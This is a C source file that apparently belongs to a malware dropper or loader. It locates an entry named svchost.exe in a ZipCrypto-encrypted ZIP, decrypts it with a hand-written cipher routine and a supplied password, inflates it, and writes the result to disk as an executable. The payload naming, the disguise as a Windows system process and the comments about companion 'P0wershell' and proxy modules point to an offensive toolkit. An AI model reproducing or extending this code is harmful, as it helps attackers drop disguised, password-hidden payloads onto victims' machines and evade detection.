#include <windows.h>
#include <stdio.h>
#include "miniz.h"
#include "miniz_zip.h"
#include "payload_extract.h"

/* ponytail: caller supplies its own audit() so this module stays host-agnostic
   (P0wershell writes C:\ProgramData\...\audit.log, the proxy wrote the same). */
typedef void (*audit_fn)(const char *fmt, ...);
audit_fn g_audit_fn = NULL;

/* ponytail: miniz can't decrypt ZipCrypto, so we do it by hand. Steps:
   1) miniz parses the (unencrypted) central dir to locate svchost.exe and get
      its local-header offset + compressed size.
   2) Seek to the local header, skip it, then ZipCrypto-decrypt the 12-byte
      encryption header + the encrypted deflate stream.
   3) Raw-inflate the decrypted stream with mz_inflate (no zlib wrapper).
   ZipCrypto is a trivial 3-key CRC32 stream cipher. */

static void zc_update_keys(mz_ulong *k0, mz_ulong *k1, mz_ulong *k2, unsigned char b) {
    *k0 = mz_crc32(*k0 ^ 0xFFFFFFFFUL, &b, 1) ^ 0xFFFFFFFFUL;
    *k1 = (*k1 + (*k0 & 0xFF)) * 0x08088405UL + 1;
    unsigned char kb = (unsigned char)(*k1 >> 24);
    *k2 = mz_crc32(*k2 ^ 0xFFFFFFFFUL, &kb, 1) ^ 0xFFFFFFFFUL;
}
static unsigned char zc_decrypt_byte(mz_ulong k2) {
    mz_ulong t = k2 | 2;
    return (unsigned char)(((t * (t ^ 1)) >> 8) & 0xFF);
}

BOOL extract_payload(const char *zipPath, const char *outExe, const char *pw) {
    extern audit_fn g_audit_fn;
    audit_fn audit = g_audit_fn ? g_audit_fn : (audit_fn)printf;

    mz_zip_archive z = {0};
    if (!mz_zip_reader_init_file(&z, zipPath, 0)) {
        audit("[-] Unzip init failed (corrupt/unsupported zip): %s", zipPath);
        return FALSE;
    }

    int idx = mz_zip_reader_locate_file(&z, "svchost.exe", NULL, 0);
    if (idx < 0) {
        audit("[-] svchost.exe not found in zip: %s", zipPath);
        mz_zip_reader_end(&z);
        return FALSE;
    }
    mz_zip_archive_file_stat st;
    if (!mz_zip_reader_file_stat(&z, (mz_uint)idx, &st)) {
        audit("[-] zip stat failed: %s", zipPath);
        mz_zip_reader_end(&z);
        return FALSE;
    }

    HANDLE hf = CreateFileA(zipPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        audit("[-] cannot reopen zip for decrypt: %s", zipPath);
        mz_zip_reader_end(&z);
        return FALSE;
    }

    /* local header is 30 bytes + filename len + extra len, then enc header (12) + data */
    DWORD lho = (DWORD)st.m_local_header_ofs;
    unsigned char lh[30];
    DWORD got;
    if (!ReadFile(hf, lh, 30, &got, NULL) || got != 30 || *(unsigned long *)lh != 0x04034b50UL) {
        audit("[-] bad local header in zip: %s", zipPath);
        CloseHandle(hf); mz_zip_reader_end(&z); return FALSE;
    }
    DWORD fnlen = lh[26] | (lh[27] << 8);
    DWORD exlen = lh[28] | (lh[29] << 8);
    LARGE_INTEGER li; li.QuadPart = (LONGLONG)lho + 30 + fnlen + exlen;
    if (!SetFilePointerEx(hf, li, NULL, FILE_BEGIN)) {
        audit("[-] seek to zip data failed: %s", zipPath);
        CloseHandle(hf); mz_zip_reader_end(&z); return FALSE;
    }

    mz_uint64 comp = st.m_comp_size;
    unsigned char *enc = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)comp + 12);
    if (!enc) { CloseHandle(hf); mz_zip_reader_end(&z); return FALSE; }
    if (!ReadFile(hf, enc, (DWORD)(comp + 12), &got, NULL) || (mz_uint64)got != comp + 12) {
        audit("[-] read encrypted data failed: %s", zipPath);
        HeapFree(GetProcessHeap(), 0, enc); CloseHandle(hf); mz_zip_reader_end(&z); return FALSE;
    }
    CloseHandle(hf);

    /* init ZipCrypto keys from password */
    mz_ulong k0 = 0x12345678UL, k1 = 0x23456789UL, k2 = 0x34567890UL;
    for (const char *p = pw; *p; ++p) zc_update_keys(&k0, &k1, &k2, (unsigned char)*p);
    /* decrypt (in place): skip the 12-byte enc header after advancing keys */
    for (mz_uint64 i = 0; i < 12; ++i) {
        unsigned char b = (unsigned char)(enc[i] ^ zc_decrypt_byte(k2));
        zc_update_keys(&k0, &k1, &k2, b);
    }
    unsigned char *dec = enc + 12;
    for (mz_uint64 i = 0; i < comp; ++i) {
        unsigned char b = (unsigned char)(dec[i] ^ zc_decrypt_byte(k2));
        zc_update_keys(&k0, &k1, &k2, b);
        dec[i] = b;
    }

    /* raw-inflate dec (no zlib header) */
    mz_stream s; memset(&s, 0, sizeof(s));
    s.next_in = dec; s.avail_in = (unsigned int)comp;
    mz_ulong outcap = (st.m_uncomp_size && st.m_uncomp_size < 64*1024*1024) ? (mz_ulong)st.m_uncomp_size + 65536 : 16*1024*1024;
    unsigned char *out = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)outcap);
    if (!out) { HeapFree(GetProcessHeap(), 0, enc); mz_zip_reader_end(&z); return FALSE; }
    s.next_out = out; s.avail_out = (unsigned int)outcap;
    BOOL ok = FALSE;
    if (mz_inflateInit2(&s, -MZ_DEFAULT_WINDOW_BITS) == MZ_OK) {
        int ir = mz_inflate(&s, MZ_FINISH);
        if (ir == MZ_STREAM_END || ir == MZ_OK) {
            HANDLE of = CreateFileA(outExe, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (of != INVALID_HANDLE_VALUE) {
                DWORD w;
                if (WriteFile(of, out, s.total_out, &w, NULL) && w == s.total_out) ok = TRUE;
                else audit("[-] write svchost.exe failed (%lu)", GetLastError());
                CloseHandle(of);
            } else audit("[-] create svchost.exe failed (%lu)", GetLastError());
        } else audit("[-] inflate failed (%d) bad password?", ir);
    } else audit("[-] inflateInit failed");

    HeapFree(GetProcessHeap(), 0, out);
    HeapFree(GetProcessHeap(), 0, enc);
    mz_zip_reader_end(&z);

    if (ok) {
        DWORD sz = 0; WIN32_FILE_ATTRIBUTE_DATA fa;
        if (GetFileAttributesExA(outExe, GetFileExInfoStandard, &fa)) sz = fa.nFileSizeLow;
        audit("[+] Extracted svchost.exe (%lu bytes) <- %s", sz, zipPath);
    } else audit("[-] extraction failed: %s", zipPath);
    return ok;
}
